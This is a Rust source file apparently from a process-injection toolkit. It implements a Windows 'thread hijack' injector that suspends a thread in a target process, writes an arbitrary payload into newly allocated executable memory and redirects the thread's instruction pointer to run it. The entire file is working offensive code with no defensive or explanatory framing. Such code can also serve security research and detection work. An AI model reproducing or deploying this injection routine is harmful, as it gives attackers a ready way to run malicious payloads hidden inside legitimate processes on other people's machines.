use anyhow::{anyhow, Result};
use crate::injection::Injector;

pub struct ThreadHijackInjector;

#[cfg(windows)]
impl Injector for ThreadHijackInjector {
    fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
        use winapi::um::processthreadsapi::{OpenProcess, OpenThread, SuspendThread, GetThreadContext, SetThreadContext, ResumeThread};
        use winapi::um::winnt::{PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, CONTEXT_FULL, CONTEXT};
        use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32};
        use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
        use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};

        unsafe {
            let h_proc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
            if h_proc.is_null() { return Err(anyhow!("Failed to open process")); }

            let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
            if snapshot == INVALID_HANDLE_VALUE { return Err(anyhow!("Failed snap")); }

            let mut te32: THREADENTRY32 = std::mem::zeroed();
            te32.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;

            let mut target_tid = 0;
            if Thread32First(snapshot, &mut te32) != 0 {
                loop {
                    if te32.th32OwnerProcessID == pid {
                        target_tid = te32.th32ThreadID;
                        break;
                    }
                    if Thread32Next(snapshot, &mut te32) == 0 { break; }
                }
            }
            CloseHandle(snapshot);

            if target_tid == 0 { return Err(anyhow!("No thread found")); }

            let h_thread = OpenThread(THREAD_ALL_ACCESS, 0, target_tid);
            if h_thread.is_null() { return Err(anyhow!("Failed open thread")); }

            SuspendThread(h_thread);

            let mut ctx: CONTEXT = std::mem::zeroed();
            ctx.ContextFlags = CONTEXT_FULL;
            GetThreadContext(h_thread, &mut ctx);

            let remote_mem = VirtualAllocEx(h_proc, std::ptr::null_mut(), payload.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            
            let mut written = 0;
            WriteProcessMemory(h_proc, remote_mem, payload.as_ptr() as _, payload.len(), &mut written);

            #[cfg(target_arch = "x86_64")]
            { ctx.Rip = remote_mem as u64; }
            #[cfg(target_arch = "x86")]
            { ctx.Eip = remote_mem as u32; }

            SetThreadContext(h_thread, &ctx);
            ResumeThread(h_thread);

            CloseHandle(h_thread);
            CloseHandle(h_proc);
        }
        Ok(())
    }
}

#[cfg(not(windows))]
impl Injector for ThreadHijackInjector {
    fn inject(&self, _pid: u32, _payload: &[u8]) -> Result<()> {
        Err(anyhow!("Thread Hijacking only supported on Windows"))
    }
}
